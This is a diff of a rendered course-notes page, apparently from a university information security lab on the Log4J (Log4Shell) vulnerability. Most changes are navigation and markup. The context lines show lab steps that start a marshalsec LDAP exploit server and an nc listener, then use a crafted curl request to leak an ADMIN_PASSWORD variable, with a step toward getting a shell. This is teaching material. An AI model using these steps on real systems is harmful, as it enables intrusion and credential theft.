@@ -12,11 +12,11 @@
     <script src="../../_static/js/html5shiv.min.js"></script>
   <![endif]-->
   
-        <script src="../../_static/jquery.js"></script>
-        <script src="../../_static/_sphinx_javascript_frameworks_compat.js"></script>
-        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
-        <script src="../../_static/doctools.js"></script>
-        <script src="../../_static/sphinx_highlight.js"></script>
+        <script src="../../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script src="../../_static/documentation_options.js?v=5929fcd5"></script>
+        <script src="../../_static/doctools.js?v=888ff710"></script>
+        <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
     <script src="../../_static/js/theme.js"></script>
     <link rel="index" title="Index" href="../../genindex.html" />
     <link rel="search" title="Search" href="../../search.html" />
@@ -61,6 +61,14 @@
 <li class="toctree-l1"><a class="reference internal" href="../../Jap/index.html#id1">🖥️　配信</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../Jap/index.html#id2">🎶  音楽</a></li>
 </ul>
+<p class="caption" role="heading"><span class="caption-text">French</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../French/index.html">🇫🇷 Basic</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../French/index.html#a1">🇫🇷 A1</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../French/index.html#a2">🇫🇷 A2</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../French/index.html#b1">🇫🇷 B1</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../French/index.html#b2">🇫🇷 B2</a></li>
+</ul>
 <p class="caption" role="heading"><span class="caption-text">Guitar</span></p>
 <ul>
 <li class="toctree-l1"><a class="reference internal" href="../../Guitar/index.html">🎸  Level 1</a></li>
@@ -88,6 +96,7 @@
 <li class="toctree-l2"><a class="reference internal" href="note4.html">Intro to Information Security 4 | Malware Analysis</a></li>
 </ul>
 </li>
+<li class="toctree-l1"><a class="reference internal" href="../index.html#javascript-quick-notes">💻  JavaScript Quick Notes</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Arts</span></p>
 <ul>
@@ -126,11 +135,11 @@
            <div itemprop="articleBody">
              
   <section id="intro-to-information-security-3-log4j-vulnerabilities">
-<h1>Intro to Information Security 3 | Log4J Vulnerabilities<a class="headerlink" href="#intro-to-information-security-3-log4j-vulnerabilities" title="Permalink to this heading"></a></h1>
+<h1>Intro to Information Security 3 | Log4J Vulnerabilities<a class="headerlink" href="#intro-to-information-security-3-log4j-vulnerabilities" title="Link to this heading"></a></h1>
 <section id="log4j">
-<h2>1. Log4J<a class="headerlink" href="#log4j" title="Permalink to this heading"></a></h2>
+<h2>1. Log4J<a class="headerlink" href="#log4j" title="Link to this heading"></a></h2>
 <section id="intro">
-<h3>(1) Intro<a class="headerlink" href="#intro" title="Permalink to this heading"></a></h3>
+<h3>(1) Intro<a class="headerlink" href="#intro" title="Link to this heading"></a></h3>
 <ul class="simple">
 <li><p><strong>Log4J</strong> is a very popular open-source framework that allows application developers to log important messages such as program flow, program state, exceptions, etc. These messages can include user input, dynamic data, database results, etc.</p></li>
 <li><p><strong>Java Naming and Directory Interface (JNDI)</strong> creates a way for Java Objects to be looked up at runtime. An application only needs to know the JNDI name instead of having to have the connection details. JNDI uses Naming References if the object is too large.</p></li>
@@ -145,7 +154,7 @@
 </ul>
 </section>
 <section id="servers-setup">
-<h3>(2) Servers Setup<a class="headerlink" href="#servers-setup" title="Permalink to this heading"></a></h3>
+<h3>(2) Servers Setup<a class="headerlink" href="#servers-setup" title="Link to this heading"></a></h3>
 <p>Let’s first open three terminals in the virtual machine. In the first terminal, we should start the LDAP server by,</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ cd ~/Desktop/log4shell/target
 $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:4242/#Exploit&quot;
@@ -162,7 +171,7 @@ $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot
 <p>See what the options of <code class="docutils literal notranslate"><span class="pre">nc</span></code> means from this <a class="reference external" href="https://www.explainshell.com/explain?cmd=nc+-nlvp+8888">link</a>.</p>
 </section>
 <section id="task-0-get-java-version">
-<h3>(3) Task 0: get Java version<a class="headerlink" href="#task-0-get-java-version" title="Permalink to this heading"></a></h3>
+<h3>(3) Task 0: get Java version<a class="headerlink" href="#task-0-get-java-version" title="Link to this heading"></a></h3>
 <p>We can use <code class="docutils literal notranslate"><span class="pre">curl</span></code> to interact with Log4J. For example, we can run,</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ curl &#39;http://localhost:8080/rest/users/ping&#39; -H &#39;GATECH_ID:123456789&#39;
 </pre></div>
@@ -202,7 +211,7 @@ $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot
 </ul>
 </section>
 <section id="task-1-get-environment-variable">
-<h3>(1) Task 1: get environment variable<a class="headerlink" href="#task-1-get-environment-variable" title="Permalink to this heading"></a></h3>
+<h3>(1) Task 1: get environment variable<a class="headerlink" href="#task-1-get-environment-variable" title="Link to this heading"></a></h3>
 <p>Recall again for the string substitution part and this time we have to get the value of an environment variable <code class="docutils literal notranslate"><span class="pre">ADMIN_PASSWORD</span></code>. Modify the following command to construct a malicious payload,</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ curl &#39;http://localhost:8080/rest/users/ping&#39; \
 -H &#39;GATECH_ID:123456789&#39; \
@@ -212,7 +221,7 @@ $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot
 <p>Then find the flag 1 in the result.</p>
 </section>
 <section id="task-2-get-a-shell">
-<h3>(2) Task 2: Get a shell<a class="headerlink" href="#task-2-get-a-shell" title="Permalink to this heading"></a></h3>
+<h3>(2) Task 2: Get a shell<a class="headerlink" href="#task-2-get-a-shell" title="Link to this heading"></a></h3>
 <p>If you closed the terminals in the setup stage and the ports are not available, you can try to restart the virtual machine and rerun the setups.</p>
 <p>In this task, we will try to get a shell by log4J, and this task simply shows why this vulnerability is serious. To exploit this task, you will find <a class="reference external" href="https://www.youtube.com/watch?v=lJeAgQQaDEw">this video</a> useful.</p>
 <p>To solve this problem, we have to open 4 terminals.</p>
@@ -253,7 +262,7 @@ $ hostname -I | awk &#39;{print $1}&#39;
 </div>
 </section>
 <section id="id1">
-<h3>(3)<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h3>
+<h3>(3)<a class="headerlink" href="#id1" title="Link to this heading"></a></h3>
 </section>
 </section>
 </section>
